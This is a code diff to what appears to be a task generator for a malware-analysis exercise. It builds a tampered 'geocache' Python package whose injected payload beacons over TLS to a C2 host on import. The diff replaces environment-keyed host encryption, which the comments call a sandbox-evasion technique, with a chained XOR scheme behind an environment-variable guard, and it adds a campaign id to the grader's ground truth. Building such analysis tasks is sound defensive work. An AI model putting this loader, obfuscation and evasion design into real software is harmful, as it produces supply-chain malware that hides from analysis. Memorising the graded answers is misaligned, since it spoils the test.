@@ -131,38 +131,39 @@ _CLEAN_INIT = textwrap.dedent('''\
 C2_HOST = "telemetry.pkg-sync-cdn.net"
 C2_PORT = 8443
 EXFIL_ENDPOINT = "/v2/collect"
+CAMPAIGN_ID = "OP-7731-VENDORSYNC"                # stage-1 plaintext (graded)
 XOR_KEY_HEX = "9f1c33a75be24d0186ca4471e2d5b8f0"  # 16 bytes; lives in .buildcache (outer decode)
 RES_MARKER = b"\n#IDX1\n"
-KEY_ENV = "GC_BUILD_SIG"                           # runtime host-decrypt key source (env)
+GUARD_ENV = "APP_TIER"                             # beacon guard (unset in the sandbox)
+GUARD_VAL = "edge-prod"
 
-# ENVIRONMENTAL KEYING (real sandbox-evasion technique). The C2 host is stored ENCRYPTED
-# and the decryption key is NOT on disk and NOT a constant: at runtime the payload reads
-# a hex "build signature" from the environment ($GC_BUILD_SIG) and XOR-decrypts the host
-# with it. In the sandbox that variable is unset, so the payload decrypts to garbage and
-# never contacts the real host -- a "detonate and capture the socket call" attempt (even
-# with the env generically neutralised) yields a WRONG host that fails the exact-match
-# check. The real key is the module's recorded build hash (sha256 of the clean _cache.py,
-# i.e. the RECORD manifest's recorded_hash); recovering the host therefore requires
-# genuine static analysis: decode the payload, understand the env-keying, recover that
-# hash from the manifest/mirror, and decrypt. Dynamic execution alone cannot reveal it.
-_BUILD_SIG = hashlib.sha256(_CLEAN_CACHE.encode()).hexdigest()   # == recorded_hash
-_KEY16 = bytes.fromhex(_BUILD_SIG)[:16]
-_ENC_HOST = bytes(b ^ _KEY16[i % 16] for i, b in enumerate(C2_HOST.encode()))
+# MULTI-STAGE recovery. After the outer four-stage decode, the indicators are NOT sitting
+# there in plaintext -- they come out of a chain where each key is DERIVED FROM the value
+# recovered at the previous stage, never from a hash of an on-disk artifact (so there is no
+# "the key is already in the manifest" shortcut):
+#   stage 1: a plaintext campaign id  (campaign_id)
+#   stage 2: c2_host  = XOR-decrypt with sha256(campaign_id)[:16]
+#   stage 3: port + endpoint = XOR-decrypt with sha256(c2_host)[:16]
+# An agent that stops partway earns only the stages it reached (campaign, then host, then
+# port/endpoint), which spreads reward across the population instead of one all-or-nothing gate.
+_K1 = hashlib.sha256(CAMPAIGN_ID.encode()).digest()[:16]
+_ENC_HOST = bytes(b ^ _K1[i % 16] for i, b in enumerate(C2_HOST.encode()))
+_K2 = hashlib.sha256(C2_HOST.encode()).digest()[:16]
+_META = ("%d|%s" % (C2_PORT, EXFIL_ENDPOINT)).encode()
+_ENC_META = bytes(b ^ _K2[i % 16] for i, b in enumerate(_META))
 
 _PAYLOAD_SRC = (
-    "import socket, ssl, os, binascii\n"
+    "import socket, ssl, os, hashlib\n"
     "def _run():\n"
-    "    _sig = os.environ.get(%r, '')\n"
-    "    try:\n"
-    "        _k = binascii.unhexlify(_sig)\n"
-    "    except Exception:\n"
+    "    if os.environ.get(%r, '') != %r:\n"
     "        return\n"
-    "    if len(_k) < 16:\n"
-    "        return\n"
-    "    _eh = %r\n"
-    "    host = bytes(b ^ _k[i %% 16] for i, b in enumerate(_eh)).decode('utf-8', 'replace')\n"
-    "    port = %d\n"
-    "    endpoint = %r\n"
+    "    campaign = %r\n"
+    "    _k1 = hashlib.sha256(campaign.encode()).digest()[:16]\n"
+    "    host = bytes(b ^ _k1[i %% 16] for i, b in enumerate(%r)).decode('utf-8', 'replace')\n"
+    "    _k2 = hashlib.sha256(host.encode()).digest()[:16]\n"
+    "    meta = bytes(b ^ _k2[i %% 16] for i, b in enumerate(%r)).decode('utf-8', 'replace')\n"
+    "    port, endpoint = meta.split('|', 1)\n"
+    "    port = int(port)\n"
     "    try:\n"
     "        ctx = ssl.create_default_context()\n"
     "        with socket.create_connection((host, port), timeout=4) as s:\n"
@@ -172,7 +173,7 @@ _PAYLOAD_SRC = (
     "    except Exception:\n"
     "        pass\n"
     "_run()\n"
-) % (KEY_ENV, _ENC_HOST, C2_PORT, EXFIL_ENDPOINT)
+) % (GUARD_ENV, GUARD_VAL, CAMPAIGN_ID, _ENC_HOST, _ENC_META)
 
 # The loader that is appended to the legitimate _cache.py. It carries NO host and NO
 # decode of its own beyond orchestration: the blob and key are read from resources.
@@ -339,6 +340,7 @@ def ground_truth(sp, tampered_cache_b, clean_cache, key_hex, decoded_marshal):
         "compromised_package": "geocache",
         "malicious_path": os.path.join(sp, "geocache", "_cache.py"),
         "trigger": "import",
+        "campaign_id": CAMPAIGN_ID,
         "c2_host": C2_HOST,
         "c2_port": C2_PORT,
         "exfil_endpoint": EXFIL_ENDPOINT,
